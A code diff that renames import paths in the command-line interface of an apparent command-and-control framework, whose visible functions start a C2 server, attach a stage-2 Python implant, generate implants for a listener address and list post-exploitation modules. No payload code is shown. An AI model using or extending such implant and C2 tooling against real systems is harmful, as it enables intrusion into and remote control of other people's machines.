@@ -48,11 +48,11 @@ def _api_post(port: int, path: str, data: dict) -> dict:
 
 def cmd_start(args):
     """Start the C2 server."""
-    from intercept37.c2.server import C2Server
+    from c2_37.server import C2Server
     server = C2Server(port=args.port)
 
     # Auto-set stage2 payload from implant.py
-    from intercept37.c2 import payloads
+    from c2_37 import payloads
     url = f"http://0.0.0.0:{args.port}"
     stage2 = payloads.python_implant(url)
     server.set_stage2(stage2.encode())
@@ -122,7 +122,7 @@ def cmd_results(args):
 
 def cmd_generate(args):
     """Generate implants in multiple formats."""
-    from intercept37.c2 import payloads
+    from c2_37 import payloads
 
     url = f"http://{args.lhost}:{args.lport}"
     fmt = getattr(args, "format", "all")
@@ -243,7 +243,7 @@ def cmd_interact(args):
 
 def cmd_modules(args):
     """List available post-exploitation modules."""
-    from intercept37.c2.modules import list_modules
+    from c2_37.modules import list_modules
     mods = list_modules()
     print(f"\n\033[96m{'Module':20} Description\033[0m")
     print("\u2500" * 60)
